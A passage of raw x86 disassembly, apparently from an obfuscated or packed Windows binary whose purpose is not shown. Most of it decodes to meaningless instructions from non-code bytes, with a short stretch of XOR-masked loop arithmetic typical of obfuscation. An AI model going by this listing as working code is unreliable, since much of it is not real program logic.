  41ec09:	xor    BYTE PTR [esi+0x37],0x75
  41ec0d:	xchg   esi,eax
  41ec0e:	pop    ebx
  41ec0f:	jne    0x41ec8b
  41ec11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec12:	mov    al,0xa9
  41ec14:	xor    BYTE PTR [edi],ch
  41ec16:	dec    esp
  41ec17:	sub    DWORD PTR [edx],eax
  41ec19:	xchg   edi,eax
  41ec1a:	jmp    0x41ebe2
  41ec1c:	fild   WORD PTR [edx-0x719f14ed]
  41ec22:	mov    dh,0xb7
  41ec24:	sbb    BYTE PTR [ecx-0x55ce95c0],al
  41ec2a:	loope  0x41ec2d
  41ec2c:	imul   ebp,DWORD PTR [ebx-0x1e],0x938b1275
  41ec33:	in     eax,0xcf
  41ec35:	or     edx,DWORD PTR ds:0xd43b80fd
  41ec3b:	cmp    ch,bl
  41ec3d:	and    dl,0x24
  41ec40:	frstor [ebp+0x35ee0896]
  41ec46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec47:	test   BYTE PTR [ebx],ch
  41ec49:	push   eax
  41ec4a:	push   eax
  41ec4b:	pop    ds
  41ec4c:	lods   al,BYTE PTR ds:[esi]
  41ec4d:	fwait
  41ec4e:	daa    
  41ec4f:	shl    DWORD PTR [ecx+edi*8],0x48
  41ec53:	repz imul edx,DWORD PTR [ebx],0xffffffee
  41ec57:	test   al,0xa9
  41ec59:	sbb    DWORD PTR [ebx+0x3f],0xffffffe7
  41ec5d:	aad    0x3f
  41ec5f:	mov    esp,edx
  41ec61:	jl     0x41ec61
  41ec63:	dec    ebx
  41ec64:	cmovb  edx,DWORD PTR [eax+0x45c0d430]
  41ec6b:	xchg   ebp,eax
  41ec6c:	and    al,0xe8
  41ec6e:	and    eax,edx
  41ec70:	jb     0x41ec42
  41ec72:	cmp    BYTE PTR [ebx],ah
  41ec74:	jg     0x41ec80
  41ec76:	scas   eax,DWORD PTR es:[edi]
  41ec77:	xor    al,0x4b
  41ec79:	sub    dh,BYTE PTR [edx+0x58]
  41ec7c:	add    ebx,eax
  41ec7e:	test   BYTE PTR [eax+0x1247d5b4],ah
  41ec84:	mov    ah,0xc
  41ec86:	dec    eax
  41ec87:	add    DWORD PTR gs:[edi+0x563bef7f],ecx
  41ec8e:	jnp    0x41ed05
  41ec90:	mov    ds:0xd1c31616,eax
  41ec95:	cmp    bh,ch
  41ec97:	add    BYTE PTR [edx-0x5317a0c4],bl
  41ec9d:	test   cl,bl
  41ec9f:	mov    BYTE PTR [ebx],ah
  41eca1:	push   edi
  41eca2:	cmp    esi,DWORD PTR [esi+esi*4+0x3f]
  41eca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eca7:	mov    al,0x7e
  41eca9:	cld    
  41ecaa:	lahf   
  41ecab:	loop   0x41ecbc
  41ecad:	stos   DWORD PTR es:[edi],eax
  41ecae:	jmp    0x295c:0xe5e5af22
  41ecb5:	inc    ebx
  41ecb6:	jno    0x41ecb3
  41ecb8:	aaa    
  41ecb9:	outs   dx,BYTE PTR ds:[esi]
  41ecba:	int    0x16
  41ecbc:	and    al,0x6b
  41ecbe:	push   ds
  41ecbf:	jp     0x41ecc1
  41ecc1:	cmp    DWORD PTR [ebp+0x74],edx
  41ecc4:	push   ss
  41ecc5:	inc    esi
  41ecc6:	pop    eax
  41ecc7:	cld    
  41ecc8:	cmp    al,0xfc
  41ecca:	ret    
  41eccb:	mov    cl,0x59
  41eccd:	cmp    edi,ebx
  41eccf:	int3   
  41ecd0:	jp     0x41ec59
  41ecd2:	inc    eax
  41ecd3:	xor    al,0xad
  41ecd5:	sub    BYTE PTR [ebx+ebx*4-0x66],ah
  41ecd9:	mov    dl,0x82
  41ecdb:	jp     0x41ecdc
  41ecdd:	les    edx,FWORD PTR [ebx+eiz*4+0x16]
  41ece1:	inc    esi
  41ece2:	xor    al,0xb5
  41ece4:	lahf   
  41ece5:	and    edi,DWORD PTR [esi+0x136c354]
  41eceb:	mov    eax,0xa937c7cb
  41ecf0:	add    BYTE PTR [edx+ebx*2+0x59c14548],bl
  41ecf7:	mov    ecx,0x874dfd8b
  41ecfc:	pop    DWORD PTR [edi+0x5c]
  41ecff:	fwait
  41ed00:	mov    dl,0x60
  41ed02:	push   0xffffffad
  41ed04:	aam    0x0
  41ed06:	inc    eax
  41ed07:	xchg   edi,eax
  41ed08:	sub    BYTE PTR [edi+0x22],bl
  41ed0b:	sbb    bl,BYTE PTR [esi+0x50fa628c]
  41ed11:	or     ch,ch
  41ed13:	add    ebp,DWORD PTR [eax]
  41ed15:	dec    esi
  41ed16:	sub    al,0x7b
  41ed18:	and    eax,0xb78f7430
  41ed1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed1e:	push   cs
  41ed1f:	maxps  xmm6,XMMWORD PTR [ebx+0x2f29f0da]
  41ed26:	mov    ch,0xcd
  41ed28:	data16 shl BYTE PTR [ecx+0x50ece9e4],1
  41ed2f:	mov    edi,gs
  41ed31:	sahf   
  41ed32:	fs in  eax,0xcc
  41ed35:	js     0x41ed3e
  41ed37:	xchg   ebp,eax
  41ed38:	int    0x33
  41ed3a:	bnd jne 0x41ed0d
  41ed3d:	call   ebp
  41ed3f:	mov    ebx,0x127a2978
  41ed44:	mov    bl,0x45
  41ed46:	adc    BYTE PTR [esi],bl
  41ed48:	test   DWORD PTR [eax+0x41],esi
  41ed4b:	out    dx,al
  41ed4c:	out    dx,al
  41ed4d:	inc    edx
  41ed4e:	sbb    esp,DWORD PTR [edx-0x324f5df9]
  41ed54:	mov    esi,0x1cd833bf
  41ed59:	xchg   edx,eax
  41ed5a:	pop    ds
  41ed5b:	pop    edi
  41ed5c:	cwde   
  41ed5d:	sbb    al,0xae
  41ed5f:	shr    esp,cl
  41ed61:	data16 sbb ah,BYTE PTR [eax-0x6f]
  41ed65:	jp     0x41edc7
  41ed67:	outs   dx,BYTE PTR ds:[esi]
  41ed68:	pop    eax
  41ed69:	mov    ebp,0x991e5869
  41ed6e:	loopne 0x41ed75
  41ed70:	dec    edi
  41ed71:	sbb    eax,0xb2c5cbac
  41ed76:	sub    esp,edi
  41ed78:	xor    dl,ch
  41ed7a:	aas    
  41ed7b:	cdq    
  41ed7c:	(bad)  [eax]
  41ed7e:	retf   0xdd88
  41ed81:	js     0x41ed56
  41ed83:	in     al,0xa1
  41ed85:	sbb    DWORD PTR [ebx+edx*1+0x4],esi
  41ed89:	rep outs dx,BYTE PTR ds:[esi]
  41ed8b:	(bad)  
  41ed8c:	clc    
  41ed8d:	inc    edx
  41ed8e:	je     0x41ed6d
  41ed90:	test   DWORD PTR [edi+0x910dd43],ecx
  41ed96:	fs std 
  41ed98:	dec    ebp
  41ed99:	cmp    BYTE PTR [edi+0x42],ah
  41ed9c:	cld    
  41ed9d:	xchg   esi,eax
  41ed9e:	and    si,WORD PTR [esi]
  41eda1:	sti    
  41eda2:	pop    ss
  41eda3:	in     al,dx
  41eda4:	fdiv   QWORD PTR ds:0x192a0fc2
  41edaa:	sbb    esi,DWORD PTR [edx]
  41edac:	in     al,0xd1
  41edae:	scas   eax,DWORD PTR es:[edi]
  41edaf:	jle    0x41ed66
  41edb1:	or     al,0x12
  41edb3:	jmp    0x9871:0xa2d2e3e3
  41edba:	outs   dx,DWORD PTR ds:[esi]
  41edbb:	cdq    
  41edbc:	hlt    
  41edbd:	cmp    al,0x22
  41edbf:	mov    cl,0x21
  41edc1:	sbb    eax,0xfc28ea3d
  41edc6:	push   ecx
  41edc7:	sbb    cl,BYTE PTR [edx]
  41edc9:	and    DWORD PTR [edx-0x485b5440],edi
  41edcf:	mov    ds:0x5deeac9a,al
  41edd4:	push   ebp
  41edd5:	aas    
  41edd6:	push   0x1e78f3d5
  41eddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eddc:	sbb    DWORD PTR [eax-0x3fb95253],ecx
  41ede2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede3:	aad    0xdc
  41ede5:	mov    eax,DWORD PTR [ebx]
  41ede7:	xor    al,bl
  41ede9:	push   ss
  41edea:	jnp    0x41ee11
  41edec:	fdivr  QWORD PTR [eax]
  41edee:	icebp  
  41edef:	or     al,0x24
  41edf1:	xchg   edi,eax
  41edf2:	into   
  41edf3:	inc    edi
  41edf4:	inc    esp
  41edf5:	pop    ebx
  41edf6:	xor    ecx,esp
  41edf8:	dec    edi
  41edf9:	pusha  
  41edfa:	scas   eax,DWORD PTR es:[edi]
  41edfb:	int    0x13
  41edfd:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41edff:	out    0x1,eax
  41ee01:	push   ds
  41ee02:	aad    0x4f
  41ee04:	fisttp DWORD PTR [eax+0xc]
  41ee07:	aad    0xc0
  41ee09:	inc    edi
  41ee0a:	mov    ds:0x11cf2587,eax
  41ee0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee10:	sbb    DWORD PTR [edi],0x72
  41ee13:	cs rcr ebx,0xa3
  41ee17:	mov    edx,DWORD PTR [ecx]
  41ee19:	mov    ebx,0x1f901f89
  41ee1e:	mov    esi,DWORD PTR [ebx+0x61]
  41ee21:	push   esi
  41ee22:	(bad)  
  41ee24:	xchg   esi,eax
  41ee25:	inc    esp
  41ee26:	dec    esi
  41ee27:	sub    DWORD PTR [ebx+0x2a],edi
  41ee2a:	mov    ah,0x9f
  41ee2c:	add    ecx,0x74
  41ee2f:	mul    BYTE PTR [ecx-0x4a]
  41ee32:	mov    al,ds:0xf147e26a
  41ee37:	adc    al,0xa2
  41ee39:	or     al,0x2d
  41ee3b:	aas    
  41ee3c:	call   0x2db3e2a5
  41ee41:	pop    edx
  41ee42:	mov    BYTE PTR [edi],cl
  41ee44:	inc    edx
  41ee45:	or     ebp,ebx
  41ee47:	retf   0x1d9
  41ee4a:	push   0x27424175
  41ee4f:	frstor [ebx]
  41ee51:	fcom   st(3)
  41ee53:	inc    esi
  41ee54:	inc    esi
  41ee55:	ins    DWORD PTR es:[edi],dx
  41ee56:	in     eax,0x60
  41ee58:	pop    ebx
  41ee59:	pop    esp
  41ee5a:	lock in al,0xe0
  41ee5d:	call   0x21ad:0x72706680
  41ee64:	mov    esp,ecx
  41ee66:	mov    ds:0xdb1d6bc4,eax
  41ee6b:	repz inc ecx
  41ee6d:	cs jnp 0x41ee03
  41ee70:	and    dh,BYTE PTR [edx+0x3b562afd]
  41ee76:	ret    0x6cfd
  41ee79:	push   eax
  41ee7a:	xor    dl,al
  41ee7c:	enter  0x35bb,0xa0
  41ee80:	pop    ecx
  41ee81:	add    eax,0x6cc5c8cd
  41ee86:	cmc    
  41ee87:	lahf   
  41ee88:	jmp    0x41eee6
  41ee8a:	xor    eax,0xfd2c633
  41ee8f:	shl    dl,0xd8
  41ee92:	lock add DWORD PTR [edx-0x28],edi
  41ee96:	aas    
  41ee97:	pop    ecx
  41ee98:	pusha  
  41ee99:	mov    al,ds:0x2e224f25
  41ee9e:	mov    esp,0xf778479a
  41eea3:	xor    al,BYTE PTR ds:0x489f3c94
  41eea9:	inc    esi
  41eeaa:	out    0x82,al
  41eeac:	mov    esi,0xab25817b
  41eeb1:	add    DWORD PTR [esi-0x753b4d04],esp
  41eeb7:	ss fwait
  41eeb9:	dec    ecx
  41eeba:	sub    BYTE PTR [edx+0x39f0485c],cl
  41eec0:	jge    0x41eec7
  41eec2:	pop    ebp
  41eec3:	and    al,0x5a
  41eec5:	adc    BYTE PTR [ebp-0x4d],cl
  41eec8:	call   0x8b54:0x658bfc86
  41eecf:	loop   0x41eea8
  41eed1:	out    dx,eax
  41eed2:	fcomip st,st(4)
  41eed4:	stos   BYTE PTR es:[edi],al
  41eed5:	pop    ds
  41eed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eed7:	pop    ds
  41eed8:	retf   0xeae6
  41eedb:	(bad)  
  41eedc:	inc    ebp
  41eedd:	ror    DWORD PTR [ecx+ebp*4-0x1d],cl
  41eee1:	in     eax,0xbd
  41eee3:	adc    esi,edx
  41eee5:	push   esi
  41eee6:	jmp    0x13ce:0x6ddfaeba
  41eeed:	inc    eax
  41eeee:	loope  0x41ee99
  41eef0:	sbb    DWORD PTR [ecx-0x83b9dbf],0x32
  41eef7:	in     eax,0x32
  41eef9:	sbb    al,BYTE PTR [edi]
  41eefb:	add    al,0x32
  41eefd:	pop    edx
  41eefe:	cmp    DWORD PTR [eax],esi
  41ef00:	sbb    edx,DWORD PTR [edx+0x343ffec1]
  41ef06:	push   eax
  41ef07:	cmp    DWORD PTR [ecx+0x79],edx
  41ef0a:	cli    
  41ef0b:	mov    cl,BYTE PTR [esi-0xb]
  41ef0e:	es sub ebp,ebp
  41ef11:	ss push esi
  41ef13:	cwde   
  41ef14:	mov    cl,0xa4
  41ef16:	rol    BYTE PTR [eax-0x1d],cl
  41ef19:	push   ss
  41ef1a:	fdiv   QWORD PTR [edx*4-0x35cc7334]
  41ef21:	cs xchg BYTE PTR es:[ecx+0x42],bh
  41ef26:	sar    cl,0xbd
  41ef29:	cmp    BYTE PTR [edx+edi*1],dh
  41ef2c:	add    eax,0xda8ed165
  41ef31:	leave  
  41ef32:	inc    edx
  41ef33:	daa    
  41ef34:	pop    ebx
  41ef35:	pop    esp
  41ef36:	xchg   ebp,eax
  41ef37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef38:	adc    edi,edx
  41ef3a:	test   BYTE PTR [eax-0x61],0x1e
  41ef3e:	push   0x6e
  41ef40:	ins    BYTE PTR es:[edi],dx
  41ef41:	ins    BYTE PTR es:[edi],dx
  41ef42:	mov    al,ds:0x39a69029
  41ef47:	std    
  41ef48:	or     BYTE PTR [ecx],ah
  41ef4a:	xor    eax,0x6a3107b5
  41ef4f:	jo     0x41ef5e
  41ef51:	repnz nop
  41ef53:	mov    eax,ds:0x7f137192
  41ef58:	call   0x75046390
  41ef5d:	push   cs
  41ef5e:	test   DWORD PTR [ecx-0x42],0x474355f9
  41ef65:	pushf  
  41ef66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef67:	push   cs
  41ef68:	and    edx,ebp
  41ef6a:	pop    esp
  41ef6b:	cld    
  41ef6c:	adc    cl,BYTE PTR [ebp-0x26]
  41ef6f:	test   eax,0xa8035aea
  41ef74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef75:	sti    
  41ef76:	hlt    
  41ef77:	pop    edi
  41ef78:	sub    eax,0xd8d61aa1
  41ef7d:	add    BYTE PTR [edx+0x4ca0ef95],ch
  41ef83:	cdq    
  41ef84:	call   0xc7d0:0x59013ca9
  41ef8b:	(bad)  
  41ef8d:	xchg   edi,eax
  41ef8e:	mov    esi,0x3f56c9f7
  41ef93:	cmp    ah,BYTE PTR [ebx]
  41ef95:	sbb    edx,DWORD PTR [edx-0x50]
  41ef98:	clc    
  41ef99:	lods   eax,DWORD PTR ds:[esi]
  41ef9a:	mov    cl,BYTE PTR [eax+eax*1+0x43]
  41ef9e:	sub    ebp,0x10e95f59
  41efa4:	call   0xb4e4:0x30ff64c0
  41efab:	mov    bh,0x0
  41efad:	call   0xf783:0x4d0778fa
  41efb4:	push   edx
  41efb5:	int3   
  41efb6:	retf   0x72b
  41efb9:	mov    cl,0xf2
  41efbb:	mov    edi,edi
  41efbd:	int    0x2b
  41efbf:	test   bh,0xb3
  41efc2:	aad    0x5e
  41efc4:	fsubr  QWORD PTR [edx]
  41efc6:	adc    dl,BYTE PTR [ebx+0x3e]
  41efc9:	stos   DWORD PTR es:[edi],eax
  41efca:	dec    esp
  41efcb:	adc    al,0x91
  41efcd:	ret    0x6655
  41efd0:	lock xor BYTE PTR [edi+ecx*2+0x219f63e1],al
  41efd8:	dec    esi
  41efd9:	mov    eax,0x9a0d7ccd
  41efde:	xchg   DWORD PTR [ebp+0x7d0002ac],edi
  41efe4:	test   eax,0x7db05d1c
  41efe9:	push   ds
  41efea:	mov    dl,0x79
  41efec:	mov    ds:0xe70661bd,al
  41eff1:	repnz (bad) 
  41eff3:	inc    edx
  41eff4:	xor    eax,0x5e4a72ba
  41eff9:	xchg   DWORD PTR [edx],edi
  41effb:	popa   
  41effc:	aas    
  41effd:	pop    ds
  41effe:	xor    ecx,eax
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xfc076403
  41f0bf:	jnp    0x41f0fa
  41f0c1:	push   ecx
  41f0c2:	fsub   DWORD PTR [ecx+0x62]
  41f0c5:	cmp    al,0x5f
  41f0c7:	bound  esp,QWORD PTR [edx-0x72]
  41f0ca:	push   esi
  41f0cb:	inc    ecx
  41f0cc:	ret    
  41f0cd:	sub    eax,0xc031d868
  41f0d2:	aam    0xd2
  41f0d4:	out    0x8,eax
  41f0d6:	push   cs
  41f0d7:	jne    0x41f0d4
  41f0d9:	add    DWORD PTR [ebx+edx*4],ebp
  41f0dc:	cmp    al,0x90
  41f0de:	dec    edi
  41f0df:	js     0x41f066
  41f0e1:	(bad)  
  41f0e2:	mov    edi,0xc41a2079
  41f0e7:	jmp    0x41f0e0
  41f0e9:	mov    cl,0xe1
  41f0eb:	test   eax,0xec56ee
  41f0f0:	sti    
  41f0f1:	js     0x41f103
  41f0f3:	(bad)  
  41f0f4:	in     al,dx
  41f0f5:	jmp    0x41f11f
  41f0f7:	add    ebp,DWORD PTR [edi+0xcbfce95]
  41f0fd:	xchg   ebp,eax
  41f0fe:	dec    ebp
  41f0ff:	repz mul DWORD PTR [esi+ecx*8]
  41f103:	cwde   
  41f104:	cmp    al,0x2f
  41f106:	shr    BYTE PTR [edx-0x12ab1ee1],0xb
  41f10d:	push   ebx
  41f10e:	sbb    dh,dl
  41f110:	mov    dh,0x14
  41f112:	test   eax,0x1bef0d85
  41f117:	les    edi,FWORD PTR [ebx+0x59]
  41f11a:	mov    edx,0x3b2ad3fe
  41f11f:	aaa    
  41f120:	fnsave [ecx+0x3]
  41f123:	inc    DWORD PTR [edx+0x60]
  41f126:	sbb    esi,DWORD PTR [esi]
  41f128:	or     DWORD PTR [ebx],edx
  41f12a:	rol    BYTE PTR [ecx],1
  41f12c:	and    ecx,DWORD PTR ds:0xdf0ffc72
  41f132:	(bad)  
  41f133:	mov    ebx,0x1e83970f
  41f138:	dec    ebx
  41f139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f13a:	dec    esi
  41f13b:	out    dx,al
  41f13c:	aad    0xd
  41f13e:	cmp    ch,dh
  41f140:	inc    ebx
  41f141:	out    0x99,eax
  41f143:	inc    ecx
  41f144:	xlat   BYTE PTR ds:[ebx]
  41f145:	dec    esi
  41f146:	inc    ebp
  41f147:	sar    DWORD PTR [eax],1
  41f149:	xor    al,0x7f
  41f14b:	mov    esi,0x16fa0f88
  41f150:	fcom   DWORD PTR [edi+0x30]
  41f153:	dec    ecx
  41f154:	fs jle 0x41f198
  41f157:	js     0x41f0ec
  41f159:	sbb    eax,0x1a3e8d8e
  41f15e:	cmp    DWORD PTR [ebp+0x6098b8ad],edx
  41f164:	xor    dl,BYTE PTR [bp+si]
  41f167:	inc    eax
  41f168:	int3   
  41f169:	repnz arpl WORD PTR [eax-0xb1a028],ax
  41f170:	ficomp WORD PTR ds:0x7fe57121
  41f176:	lds    esi,FWORD PTR [edx]
  41f178:	add    ebx,DWORD PTR [eax+0x423373be]
  41f17e:	cld    
  41f17f:	dec    esi
  41f180:	lea    edx,[edx-0x523645c7]
  41f186:	mov    ah,0x91
  41f188:	adc    eax,0xaf1eaccf
  41f18d:	rcr    BYTE PTR [esi-0x329b7a8],cl
  41f193:	cmp    esi,DWORD PTR [eax+0x1dc14b12]
  41f199:	(bad)  
  41f19a:	jp     0x41f1dd
  41f19c:	data16 mov WORD PTR [ebp-0xf8212ae],fs
  41f1a3:	mov    dl,0xe7
  41f1a5:	imul   edi,eax,0xa0d48a41
  41f1ab:	mov    ds:0x954fdbde,al
  41f1b0:	mov    eax,ds:0xba59cdd5
  41f1b5:	mov    esi,0x4201d8ac
  41f1ba:	pushf  
  41f1bb:	in     eax,dx
  41f1bc:	fisttp DWORD PTR [ebp-0x2f87f8be]
  41f1c2:	mov    ecx,0x262d57a2
  41f1c7:	sub    edx,esp
  41f1c9:	sub    eax,DWORD PTR [eax]
  41f1cb:	loop   0x41f1f5
  41f1cd:	or     BYTE PTR [esi-0x5aab7a9a],0x21
  41f1d4:	ror    BYTE PTR [esi-0x579ab2ee],1
  41f1da:	dec    eax
  41f1db:	scas   eax,DWORD PTR es:[edi]
  41f1dc:	nop
  41f1dd:	jl     0x41f162
  41f1df:	mov    WORD PTR ds:0x97e46444,cs
  41f1e5:	ds push ss
  41f1e7:	adc    edx,DWORD PTR [esp+ecx*8]
  41f1ea:	push   edx
  41f1eb:	call   0xce4e501a
  41f1f0:	push   ss
  41f1f1:	lds    esp,FWORD PTR [edx-0x7bf8ae28]
  41f1f7:	add    BYTE PTR [edx+eax*8-0x28],dh
  41f1fb:	(bad)  
  41f1fc:	mov    eax,ds:0xb2559705
  41f201:	jl     0x41f213
  41f203:	out    0xb0,eax
  41f205:	jle    0x41f190
  41f207:	loop   0x41f199
  41f209:	fldcw  WORD PTR [edx+esi*2]
  41f20c:	push   0xffffff93
  41f20e:	mov    ebx,0xac726379
  41f213:	cmp    BYTE PTR [eax+eax*2],0xdb
  41f217:	mov    al,0xf1
  41f219:	pop    esi
  41f21a:	mov    DWORD PTR [eax-0x7347c955],ebp
  41f220:	imul   edx,DWORD PTR [ecx],0xffffff86
  41f223:	pop    ss
  41f224:	sahf   
  41f225:	add    eax,0x53c913e4
  41f22a:	pop    es
  41f22b:	fistp  QWORD PTR [edi]
  41f22d:	cs (bad) 
  41f22f:	adc    eax,DWORD PTR [ebx-0x16]
  41f232:	or     eax,0x7b97e570
  41f237:	or     DWORD PTR [ecx+eiz*4],ebp
  41f23a:	(bad)  
  41f23b:	div    BYTE PTR [ebp+0x6]
  41f23e:	das    
  41f23f:	inc    esi
  41f240:	jle    0x41f1e5
  41f242:	arpl   WORD PTR gs:[ebp-0x1d96b9e7],dx
  41f249:	es dec eax
  41f24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24c:	jle    0x41f207
  41f24e:	ret    0x5695
  41f251:	fdivrp st(5),st
  41f253:	(bad)  
  41f254:	xchg   esi,eax
  41f255:	push   ds
  41f256:	icebp  
  41f257:	gs mov ebx,es
  41f25a:	add    esp,ebp
  41f25c:	fldenv [ebx]
  41f25e:	xchg   ecx,eax
  41f25f:	(bad)  
  41f260:	fdivr  QWORD PTR [edi-0x39]
  41f263:	mov    esi,0x737ba2c5
  41f268:	aaa    
  41f269:	cld    
  41f26a:	aam    0x18
  41f26c:	(bad)  
  41f26d:	in     al,dx
  41f26e:	es sahf 
  41f270:	pop    ebp
  41f271:	xchg   ebp,eax
  41f272:	mov    al,al
  41f274:	test   DWORD PTR ds:0x11e76182,esi
  41f27a:	in     eax,0x74
  41f27c:	icebp  
  41f27d:	xchg   edi,eax
  41f27e:	xchg   ecx,eax
  41f27f:	ret    0x8e1c
  41f282:	dec    eax
  41f283:	call   0x85a7866d
  41f288:	sub    esp,DWORD PTR ds:0x4c71b90
  41f28e:	inc    edx
  41f28f:	inc    esp
  41f290:	outs   dx,BYTE PTR ds:[esi]
  41f291:	jno    0x41f296
  41f293:	retf   0x238
  41f296:	jne    0x41f2b9
  41f298:	stc    
  41f299:	mov    ds:0x662db4f9,al
  41f29e:	mov    eax,ds:0x413bd66
  41f2a3:	push   ecx
  41f2a4:	xlat   BYTE PTR ds:[ebx]
  41f2a5:	jo     0x41f277
  41f2a7:	mov    esp,esp
  41f2a9:	stos   BYTE PTR es:[edi],al
  41f2aa:	xchg   edi,eax
  41f2ab:	inc    edx
  41f2ac:	jmp    0x41f26a
  41f2ae:	test   al,0x89
  41f2b0:	out    dx,al
  41f2b1:	push   ds
  41f2b2:	scas   eax,DWORD PTR es:[edi]
  41f2b3:	inc    ebx
  41f2b4:	es pop ebp
  41f2b6:	add    bh,cl
  41f2b8:	ins    DWORD PTR es:[edi],dx
  41f2b9:	cwde   
  41f2ba:	fcomp  DWORD PTR [ebx]
  41f2bc:	popf   
  41f2bd:	fwait
  41f2be:	outs   dx,BYTE PTR ds:[esi]
  41f2bf:	mov    eax,ds:0x20a088f0
  41f2c4:	jl     0x41f32f
  41f2c6:	jo     0x41f27a
  41f2c8:	cli    
  41f2c9:	imul   esi,DWORD PTR [esi],0xa1ff3150
  41f2cf:	ja     0x41f284
  41f2d1:	pusha  
  41f2d2:	(bad)  
  41f2d3:	mov    bh,0x10
  41f2d5:	dec    edi
  41f2d6:	cmp    al,0xd2
  41f2d8:	and    al,BYTE PTR [esi+0xe]
  41f2db:	adc    dh,BYTE PTR [esi]
  41f2dd:	imul   ebp,ebp,0xc72101
  41f2e3:	dec    esp
  41f2e4:	fdivrp st(7),st
  41f2e6:	outs   dx,BYTE PTR ds:[esi]
  41f2e7:	cmp    edi,DWORD PTR [ebp+eiz*2+0x35617a56]
  41f2ee:	sbb    ebx,DWORD PTR [ebp+0x1]
  41f2f1:	sub    ecx,DWORD PTR [ebx-0x5b]
  41f2f4:	stos   DWORD PTR es:[edi],eax
  41f2f5:	add    eax,DWORD PTR [ebx]
  41f2f7:	sbb    eax,0x5d4db28e
  41f2fc:	pop    esp
  41f2fd:	sub    ecx,DWORD PTR [edx-0x32]
  41f300:	out    0x51,eax
  41f302:	dec    esi
  41f303:	dec    ecx
  41f304:	aad    0x64
  41f306:	sub    ah,BYTE PTR [ebx-0x41]
  41f309:	push   0x9b26c82c
  41f30e:	ds fwait
  41f310:	sbb    ah,BYTE PTR [ecx]
  41f312:	inc    ebx
  41f313:	inc    esp
  41f314:	loope  0x41f376
  41f316:	jp     0x41f2bf
  41f318:	sbb    ch,ch
  41f31a:	or     DWORD PTR cs:[ebx+0x13],ebx
  41f31e:	mov    al,ds:0xab1da03f
  41f323:	mov    dh,0x6
  41f325:	in     al,0x4f
  41f327:	mov    ebp,0x52bcdcff
  41f32c:	stos   DWORD PTR es:[edi],eax
  41f32d:	mov    WORD PTR [ecx+0xbd503c2],fs
  41f333:	adc    al,0x9c
  41f335:	imul   ebp,DWORD PTR [esi],0xd
  41f338:	dec    edi
  41f339:	sbb    BYTE PTR [edi-0x46d8801f],0xd4
  41f340:	(bad)  
  41f341:	into   
  41f342:	sbb    DWORD PTR [ebp+0x498961cf],esi
  41f348:	and    eax,DWORD PTR [esi+0xd]
  41f34b:	mov    ds:0x4375405a,al
  41f350:	cli    
  41f351:	ins    DWORD PTR es:[edi],dx
  41f352:	sub    eax,0x885ccfd3
  41f357:	fldcw  WORD PTR [ebp+ecx*2-0x6f]
  41f35b:	pop    ebp
  41f35c:	or     BYTE PTR [eax+ebx*2-0x32],0x97
  41f361:	ror    DWORD PTR [ecx+0x2],1
  41f364:	or     edi,DWORD PTR [eax+0x24]
  41f367:	push   cs
  41f368:	jns    0x41f398
  41f36a:	ins    DWORD PTR es:[edi],dx
